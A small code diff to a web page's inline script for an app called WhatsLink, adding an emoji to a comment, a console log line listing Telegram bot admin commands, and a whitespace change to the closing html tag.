@@ -2104,12 +2144,13 @@ auth.onAuthStateChanged(async (user) => {
 });
 
 // ============================================================
-// INIT
+// 🚀 INIT
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 WhatsLink - Complete Professional System');
     console.log('📱 Firebase + Telegram Bot Integration');
     console.log('🔗 Real WhatsApp OTP System');
+    console.log('🐍 Telegram Bot Commands: /disable UID, /enable UID');
 
     const params = new URLSearchParams(window.location.search);
     const ref = params.get('ref');
@@ -2122,4 +2163,4 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 </body>
-</html>
+    </html>
